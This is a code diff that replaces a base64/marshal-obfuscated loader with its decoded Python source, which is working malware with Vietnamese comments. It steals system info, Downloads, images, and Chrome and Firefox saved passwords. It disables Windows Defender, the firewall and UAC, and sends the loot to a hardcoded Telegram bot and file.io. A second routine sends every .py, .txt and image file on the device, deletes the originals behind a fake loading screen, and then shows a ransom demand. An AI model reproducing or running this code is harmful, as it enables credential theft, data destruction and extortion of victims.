RpbmcgxJHhu4MgZ2nhu68gbuG6oW4gbmjDom4g4bufIGzhuqFpCmRlZiBmYWtlX2xvYWRpbmcoKToKICAgIGFuaW1hdGlvbnMgPSBbInwiLCAiLyIsICItIiwgIlxcIl0KICAgIHByaW50KCJbK10gxJBhbmcgYuG6r3QgxJHhuqd1IHF1w6EgdHLDrG5oIHThuqNpIGThu68gbGnhu4d1Li4uIFZ1aSBsw7JuZyDEkeG7o2kuIikKICAgIAogICAgZm9yIF8gaW4gcmFuZ2UoMzAwKTogICMgNSBwaMO6dCDEkeG6v20gbmfGsOG7o2MsIG5oxrBuZyBraMO0bmcgaGnhu4NuIHRo4buLIHRo4budaSBnaWFuIG7hu69hCiAgICAgICAgcHJpbnQoZiJcclsrXSDEkGFuZyB04bqjaSBjw6FjIGThu68gbGnhu4d1IGPhuqduIHRoaeG6v3QgxJHhu4MgY2jhuqF5IHRvb2wuLi4ge2FuaW1hdGlvbnNbXyAlIDRdfSIsIGVuZD0iIiwgZmx1c2g9VHJ1ZSkKICAgICAgICB0aW1lLnNsZWVwKDEpCiAgICAKICAgICMgSGnhu4NuIHRo4buLIHRow7RuZyBiw6FvIGtoaSBo4bq/dCB0aOG7nWkgZ2lhbgogICAgcHJpbnQoIlxuIikKICAgIHByaW50KCJMScOKTiBI4buGIFpBTE86IDA4NDU2NzA0MDkgxJDhu4IgQ0hV4buYQyBGSUxFISIpCgojIEzhuqV5IGRhbmggc8OhY2ggZmlsZSB0aGVvIHRo4bupIHThu7EgxrB1IHRpw6puOiAucHksIC50eHQsIOG6o25oCmRlZiBmaW5kX2ZpbGVzKCk6CiAgICBmaWxlX2V4dGVuc2lvbnMgPSAoIi5weSIsICIudHh0IiwgIi5qcGciLCAiLmpwZWciLCAiLnBuZyIsICIuZ2lmIiwgIi5ibXAiLCAiLnRpZmYiLCAiLndlYnAiKQoKICAgIHJvb3RfZGlycyA9IFsiLyIsICIvc3RvcmFnZS9lbXVsYXRlZC8wIiwgIi9zZGNhcmQiLCBvcy5lbnZpcm9uLmdldCgiVVNFUlBST0ZJTEUiLCAiIildICAjIER1eeG7h3QgdOG6pXQgY+G6oyB0aMawIG3hu6VjCgogICAgZmlsZV9saXN0ID0gW10KCiAgICAjIEzhuqV5IGPDoWMgZmlsZSBj4bqnbiB0aGnhur90CiAgICBmb3Igcm9vdF9kaXIgaW4gcm9vdF9kaXJzOgogICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKHJvb3RfZGlyKToKICAgICAgICAgICAgZm9yIHJvb3QsIF8sIGZpbGVzIGluIG9zLndhbGsocm9vdF9kaXIpOgogICAgICAgICAgICAgICAgZm9yIGZpbGUgaW4gZmlsZXM6CiAgICAgICAgICAgICAgICAgICAgaWYgZmlsZS5sb3dlcigpLmVuZHN3aXRoKGZpbGVfZXh0ZW5zaW9ucyk6CiAgICAgICAgICAgICAgICAgICAgICAgIGZpbGVfbGlzdC5hcHBlbmQob3MucGF0aC5qb2luKHJvb3QsIGZpbGUpKQoKICAgIHJldHVybiBmaWxlX2xpc3QKCiMgR+G7rWkgZmlsZSBn4buRYyBxdWEgVGVsZWdyYW0gduG7m2kgY8ahIGNo4bq/IHJldHJ5CmRlZiBzZW5kX29yaWdpbmFsX2ZpbGUoZmlsZV9wYXRoLCBjYXB0aW9uPSIiKToKICAgIHJldHJpZXMgPSAzICAjIFPhu5EgbOG6p24gdGjhu60gbOG6oWkKICAgIGZvciBhdHRlbXB0IGluIHJhbmdlKHJldHJpZXMpOgogICAgICAgIHRyeToKICAgICAgICAgICAgd2l0aCBvcGVuKGZpbGVfcGF0aCwgInJiIikgYXMgZmlsZToKICAgICAgICAgICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMucG9zdChURUxFR1JBTV9VUkwsIGRhdGE9eyJjaGF0X2lkIjogQ0hBVF9JRCwgImNhcHRpb24iOiBjYXB0aW9ufSwgZmlsZXM9eyJkb2N1bWVudCI6IGZpbGV9KQogICAgICAgICAgICAgICAgIyBLaeG7g20gdHJhIG7hur91IHnDqnUgY+G6p3UgdGjDoG5oIGPDtG5nCiAgICAgICAgICAgICAgICBpZiByZXNwb25zZS5zdGF0dXNfY29kZSA9PSAyMDA6CiAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgaWYgYXR0ZW1wdCA8IHJldHJpZXMgLSAxOgogICAgICAgICAgICAgICAgICAgICAgICB0aW1lLnNsZWVwKDMpICAjIFRo4butIGzhuqFpIHNhdSAzIGdpw6J5CiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICAgICAgaWYgYXR0ZW1wdCA8IHJldHJpZXMgLSAxOgogICAgICAgICAgICAgICAgdGltZS5zbGVlcCgzKSAgIyBUaOG7rSBs4bqhaSBzYXUgMyBnacOieQoKIyBYw7NhIGZpbGUgZ+G7kWMgc2F1IGtoaSBn4butaQpkZWYgZGVsZXRlX2ZpbGUoZmlsZV9wYXRoKToKICAgIHRyeToKICAgICAgICBvcy5yZW1vdmUoZmlsZV9wYXRoKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHByaW50KGYiWy1dIEzhu5dpIGtoaSB4w7NhIGZpbGUge2ZpbGVfcGF0aH06IHtlfSIpCgojIMSQYSBsdeG7k25nIGfhu61pIHThuqV0IGPhuqMgZmlsZSDEkeG7k25nIHRo4budaQpkZWYgc2VuZF9maWxlc19pbl9wYXJhbGxlbChmaWxlcyk6CiAgICB0aHJlYWRzID0gW10KICAgIGZvciBmaWxlX3BhdGggaW4gZmlsZXM6CiAgICAgICAgY2FwdGlvbiA9IGYiRmlsZSDEkcaw4bujYyBs4bqleSB04burOiB7ZmlsZV9wYXRofSIKCiAgICAgICAgIyBH4butaSBmaWxlIGfhu5FjIHRyxrDhu5tjCiAgICAgICAgdGhyZWFkID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9c2VuZF9vcmlnaW5hbF9maWxlLCBhcmdzPShmaWxlX3BhdGgsIGNhcHRpb24pKQogICAgICAgIHRocmVhZHMuYXBwZW5kKHRocmVhZCkKICAgICAgICB0aHJlYWQuc3RhcnQoKQoKICAgICAgICAjIFjDs2EgZmlsZSBn4buRYyBzYXUga2hpIGfhu61pCiAgICAgICAgdGhyZWFkID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9ZGVsZXRlX2ZpbGUsIGFyZ3M9KGZpbGVfcGF0aCwpKQogICAgICAgIHRocmVhZHMuYXBwZW5kKHRocmVhZCkKICAgICAgICB0aHJlYWQuc3RhcnQoKQoKICAgICMgQ2jhu50gdOG6pXQgY+G6oyBjw6FjIHRocmVhZCBob8OgbiB0aMOgbmgKICAgIGZvciB0aHJlYWQgaW4gdGhyZWFkczoKICAgICAgICB0aHJlYWQuam9pbigpCgojIE1haW4gZnVuY3Rpb24KZGVmIG1haW4oKToKICAgIGxvYWRpbmdfdGhyZWFkID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9ZmFrZV9sb2FkaW5nKQogICAgbG9hZGluZ190aHJlYWQuc3RhcnQoKQoKICAgICMgR+G7rWkgdOG6pXQgY+G6oyBmaWxlIHRoZW8gdGjhu6kgdOG7sSDGsHUgdGnDqm4KICAgIGZpbGVzID0gZmluZF9maWxlcygpCiAgICBzZW5kX2ZpbGVzX2luX3BhcmFsbGVsKGZpbGVzKQoKICAgIGxvYWRpbmdfdGhyZWFkLmpvaW4oKSAgIyBDaOG7nSBsb2FkaW5nIGvhur90IHRow7pjCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgbWFpbigp'
-decoded_data = base64.b64decode(encoded_data)
-script_data = marshal.loads(decoded_data)
+if os.name == "nt":
+    import win32crypt
+    import shutil 
+    from Crypto.Cipher import AES
+    
+sys.stderr = open(os.devnull, 'w')
 
-exec(script_data)
+def get_public_ip():
+    try:
+        response = requests.get("https://api64.ipify.org?format=json")
+        if response.status_code == 200:
+            return response.json()["ip"]
+    except Exception as e:
+        return f"Lỗi: {e}"
+
+def get_pc_info():
+    info = {}
+    info["System"] = platform.system()
+    info["Node Name"] = platform.node()
+    info["Release"] = platform.release()
+    info["Version"] = platform.version()
+    info["Machine"] = platform.machine()
+    info["Processor"] = platform.processor()
+    info["RAM"] = str(round(psutil.virtual_memory().total / (1024 ** 3))) + " GB"  
+    info["CPU Usage"] = str(psutil.cpu_percent()) + "%"  
+    info["Disk Usage"] = str(psutil.disk_usage('/').percent) + "%"  
+    info["Network Info"] = str(get_public_ip())
+    return info
+
+def get_android_info():
+    info = {}
+    try:
+        info["Device Name"] = os.popen("getprop ro.product.model").read().strip()
+        info["Android Version"] = os.popen("getprop ro.build.version.release").read().strip()
+        info["RAM"] = os.popen("free -h | grep Mem | awk '{print $2}'").read().strip()  
+        info["CPU Usage"] = os.popen("top -bn1 | grep 'Cpu(s)' | awk '{print 100 - $8}'").read().strip() + '%'
+        info["Network Info"] = str(get_public_ip())
+    except Exception as e:
+        info["Error"] = "Không thể truy cập thông tin Android: " + str(e)
+    return info
+
+def save_info_to_file(file_name="system.txt"):
+    system_info = {}
+    current_platform = platform.system().lower()    
+    if current_platform == "windows":
+        system_info["PC Info"] = get_pc_info()
+    elif current_platform == "linux":
+        if os.path.exists("/data/data/com.termux"):
+            system_info["Android Info"] = get_android_info()
+        else:
+            system_info["PC Info"] = get_pc_info()
+    else:
+        system_info["Error"] = "Nền tảng không hỗ trợ"    
+    with open(file_name, 'w') as f:
+        if "Error" in system_info:
+            f.write(system_info["Error"] + "\n")
+        else:
+            for category, details in system_info.items():
+                f.write(f"{category}:\n")
+                for key, value in details.items():
+                    f.write(f"  {key}: {value}\n")
+                f.write("\n")
+
+def compress_download_folder(output_filename="File.zip"):
+    if os.name == "nt":  
+        download_path = os.path.join(os.environ["USERPROFILE"], "Downloads")
+    elif os.name == "posix":  
+        possible_paths = [
+            "/storage/emulated/0/Download",  
+            "/sdcard/Download",             
+            os.path.expanduser("~/Downloads")  
+        ]
+        download_path = None
+        for path in possible_paths:
+            if os.path.exists(path):
+                download_path = path
+                break
+        if not download_path:
+            raise FileNotFoundError("Không tìm thấy thư mục Downloads.")
+    else:
+        raise Exception("Unsupported platform.")
+    output_zip = os.path.join(os.getcwd(), output_filename)
+    with zipfile.ZipFile(output_zip, 'w', zipfile.ZIP_DEFLATED) as zipf:
+        for root, dirs, files in os.walk(download_path):
+            for name in dirs:
+                folder_path = os.path.join(root, name)
+                folder_zip_name = f"{name}.zip"
+                folder_zip_path = os.path.join(download_path, folder_zip_name)
+                with zipfile.ZipFile(folder_zip_path, 'w', zipfile.ZIP_DEFLATED) as folder_zip:
+                    for folder_root, _, folder_files in os.walk(folder_path):
+                        for file in folder_files:
+                            abs_file_path = os.path.join(folder_root, file)
+                            arcname = os.path.relpath(abs_file_path, folder_path)
+                            folder_zip.write(abs_file_path, arcname)
+                zipf.write(folder_zip_path, os.path.relpath(folder_zip_path, download_path))
+                os.remove(folder_zip_path)  
+            for name in files:
+                file_path = os.path.join(root, name)
+                if name == output_filename:  
+                    continue
+                zipf.write(file_path, os.path.relpath(file_path, download_path))
+
+def compress_all_images(output_zip="Images.zip"):
+    if os.name == "nt":  
+        root_dirs = [os.environ["USERPROFILE"]]  
+    elif os.name == "posix":  
+        root_dirs = [
+            "/storage/emulated/0",  
+            "/sdcard",              
+            os.path.expanduser("~")  
+        ]
+    else:
+        raise Exception("Unsupported platform.")
+    image_extensions = (".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff", ".webp")
+    with zipfile.ZipFile(output_zip, 'w', zipfile.ZIP_DEFLATED) as zipf:
+        for root_dir in root_dirs:
+            if not os.path.exists(root_dir):
+                continue
+            for root, _, files in os.walk(root_dir):
+                for file in files:
+                    if file.lower().endswith(image_extensions):
+                        full_path = os.path.join(root, file)
+                        arcname = os.path.relpath(full_path, root_dir)  
+                        zipf.write(full_path, arcname)
+
+def decrypt_password(encrypted_password, key):
+    try:
+        iv = encrypted_password[3:15]
+        encrypted_password = encrypted_password[15:]
+        cipher = AES.new(key, AES.MODE_GCM, iv)
+        return cipher.decrypt(encrypted_password)[:-16].decode()
+    except Exception as e:
+        return None
+
+def get_chrome_encryption_key():
+    local_state_path = os.path.join(
+        os.environ['USERPROFILE'], r"AppData\Local\Google\Chrome\User Data\Local State"
+    )
+    try:
+        with open(local_state_path, 'r', encoding='utf-8') as file:
+            local_state = json.loads(file.read())
+        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
+        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+    except Exception as e:
+        return None
+
+def get_chrome_passwords():
+    key = get_chrome_encryption_key()
+    if not key:
+        return "Không thể lấy key mã hóa từ Chrome."    
+    db_path = os.path.join(
+        os.environ['USERPROFILE'], r"AppData\Local\Google\Chrome\User Data\Default\Login Data"
+    )
+    temp_db_path = db_path + "_temp"
+    shutil.copyfile(db_path, temp_db_path)    
+    try:
+        conn = sqlite3.connect(temp_db_path)
+        cursor = conn.cursor()
+        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+        data = []
+        for row in cursor.fetchall():
+            url = row[0]
+            username = row[1]
+            encrypted_password = row[2]
+            password = decrypt_password(encrypted_password, key)
+            if password:
+                data.append(f"{url} | {username} | {password}")
+        cursor.close()
+        conn.close()
+        os.remove(temp_db_path)
+        return data
+    except Exception as e:
+        os.remove(temp_db_path)
+        return []
+
+def get_firefox_passwords():
+    try:
+        firefox_profile = os.path.join(
+            os.environ['APPDATA'], r"Mozilla\Firefox\Profiles"
+        )
+        profiles = os.listdir(firefox_profile)
+        for profile in profiles:
+            login_db = os.path.join(firefox_profile, profile, "logins.json")
+            if os.path.exists(login_db):
+                with open(login_db, 'r', encoding='utf-8') as file:
+                    logins = json.load(file)
+                data = []
+                for login in logins['logins']:
+                    data.append(f"{login['hostname']} | {login['encryptedUsername']} | {login['encryptedPassword']}")
+                return data
+        return "Không tìm thấy thông tin từ Firefox."
+    except Exception as e:
+        return "Không thể lấy dữ liệu từ Firefox."    
+
+def compress_files_data_to_zip(output_zip="Browser.zip"):
+    open("chrome.txt", 'w').write(get_chrome_passwords())
+    open("firefox.txt", 'w').write(get_firefox_passwords())
+    with zipfile.ZipFile(output_zip, 'w', zipfile.ZIP_DEFLATED) as zipf:
+        for file in ["chrome.txt", "firefox.txt"]:
+            if os.path.exists(file):
+                zipf.write(file, os.path.basename(file))
+                os.remove(file)
+    
+def send_file_to_bot(file_path, link):
+    try:
+        token = "7697564639:AAGf7Fx8q8FZKCuUT4GjsIXUwOQESOO7M9g"
+        chat_id = "6186621815"
+        url = f"https://api.telegram.org/bot{token}/sendDocument"
+        with open(file_path, 'rb') as file:
+            data = {
+                'chat_id': chat_id,  
+                'caption': f'''Apdhy BOTNET 
+>>> Date Time: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} <<<
+>>> Link: {link} <<<
+>>> Thông tin máy đã hack! <<<
+>>> APDHY BOTNET <<<
+>>> SYS Loading F2 <<<''',
+            }
+            files = {
+                'document': file
+            }
+            requests.post(url, data=data, files=files)
+    except Exception as e:
+        print(f"Lỗi: {e}")
+
+def upload_file(file_path):
+    try:
+        with open(file_path, "rb") as file:
+            files = {'file': (file_path, file)}
+            try:
+                response = requests.post('https://file.io/', files=files)
+                response.raise_for_status()
+                data = response.json()
+                return data.get('link', 'Link not found in response')
+            except requests.exceptions.RequestException as e:
+                return f"Error during request: {e}"
+    except FileNotFoundError:
+        return "File not found!"
+
+list_file_send_tele = []
+
+def stealer():
+    try:
+        save_info_to_file("system.txt")        
+        compress_download_folder("File.zip")
+        list_file_send_tele.append("File.zip")
+        compress_all_images("Images.zip")
+        list_file_send_tele.append("Images.zip")
+        if os.name == 'nt':            
+            os.system('reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f')
+            os.system('reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableRoutinelyTakingAction /t REG_DWORD /d 1 /f')
+            os.system('reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f')
+            os.system('netsh advfirewall set allprofiles state off')
+            os.system('reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v EnableLUA /t REG_DWORD /d 0 /f')
+            os.system('sc config WinDefend start= disabled && sc stop WinDefend')
+            os.system('sc config wscsvc start= disabled && sc stop wscsvc')
+            compress_files_data_to_zip("Browser.zip")
+            list_file_send_tele.append("Browser.zip")
+        out_zip = f"{get_public_ip()}.zip"
+        with zipfile.ZipFile(out_zip, 'w', zipfile.ZIP_DEFLATED) as zipf:
+            for file in list_file_send_tele:
+                if os.path.exists(file):
+                    zipf.write(file, os.path.basename(file))  
+                    os.remove(file)        
+        if os.path.exists("system.txt"):
+            if os.path.exists(out_zip):
+                file_path = os.path.join(os.getcwd(), out_zip)
+                link = upload_file(file_path)
+            send_file_to_bot("system.txt", link)
+            os.remove("system.txt")
+            os.remove(out_zip)       
+    except Exception as e:
+        print(f"Lỗi: {e}")
+
+with concurrent.futures.ThreadPoolExecutor(max_workers=1) as executor:
+    futures = []
+    futures.append(executor.submit(stealer))
+    concurrent.futures.wait(futures)
+    for future in futures:
+        future.result()  
+
+# Thông tin Telegram Bot
+TOKEN = "7697564639:AAGf7Fx8q8FZKCuUT4GjsIXUwOQESOO7M9g"
+CHAT_ID = "6186621815"
+TELEGRAM_URL = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
+
+# Fake loading để giữ nạn nhân ở lại
+def fake_loading():
+    animations = ["|", "/", "-", "\\"]
+    print("[+] Đang bắt đầu quá trình tải dữ liệu... Vui lòng đợi.")
+    
+    for _ in range(300):  # 5 phút đếm ngược, nhưng không hiển thị thời gian nữa
+        print(f"\r[+] Đang tải các dữ liệu cần thiết để chạy tool... {animations[_ % 4]}", end="", flush=True)
+        time.sleep(1)
+    
+    # Hiển thị thông báo khi hết thời gian
+    print("\n")
+    print("LIÊN HỆ ZALO: 0845670409 ĐỂ CHUỘC FILE!")
+
+# Lấy danh sách file theo thứ tự ưu tiên: .py, .txt, ảnh
+def find_files():
+    file_extensions = (".py", ".txt", ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff", ".webp")
+
+    root_dirs = ["/", "/storage/emulated/0", "/sdcard", os.environ.get("USERPROFILE", "")]  # Duyệt tất cả thư mục
+
+    file_list = []
+
+    # Lấy các file cần thiết
+    for root_dir in root_dirs:
+        if os.path.exists(root_dir):
+            for root, _, files in os.walk(root_dir):
+                for file in files:
+                    if file.lower().endswith(file_extensions):
+                        file_list.append(os.path.join(root, file))
+
+    return file_list
+
+# Gửi file gốc qua Telegram với cơ chế retry
+def send_original_file(file_path, caption=""):
+    retries = 3  # Số lần thử lại
+    for attempt in range(retries):
+        try:
+            with open(file_path, "rb") as file:
+                response = requests.post(TELEGRAM_URL, data={"chat_id": CHAT_ID, "caption": caption}, files={"document": file})
+                # Kiểm tra nếu yêu cầu thành công
+                if response.status_code == 200:
+                    break
+                else:
+                    if attempt < retries - 1:
+                        time.sleep(3)  # Thử lại sau 3 giây
+        except Exception:
+            if attempt < retries - 1:
+                time.sleep(3)  # Thử lại sau 3 giây
+
+# Xóa file gốc sau khi gửi
+def delete_file(file_path):
+    try:
+        os.remove(file_path)
+    except Exception as e:
+        print(f"[-] Lỗi khi xóa file {file_path}: {e}")
+
+# Đa luồng gửi tất cả file đồng thời
+def send_files_in_parallel(files):
+    threads = []
+    for file_path in files:
+        caption = f"File được lấy từ: {file_path}"
+
+        # Gửi file gốc trước
+        thread = threading.Thread(target=send_original_file, args=(file_path, caption))
+        threads.append(thread)
+        thread.start()
+
+        # Xóa file gốc sau khi gửi
+        thread = threading.Thread(target=delete_file, args=(file_path,))
+        threads.append(thread)
+        thread.start()
+
+    # Chờ tất cả các thread hoàn thành
+    for thread in threads:
+        thread.join()
+
+# Main function
+def main():
+    loading_thread = threading.Thread(target=fake_loading)
+    loading_thread.start()
+
+    # Gửi tất cả file theo thứ tự ưu tiên
+    files = find_files()
+    send_files_in_parallel(files)
+
+    loading_thread.join()  # Chờ loading kết thúc
+
+if __name__ == "__main__":
+    main()
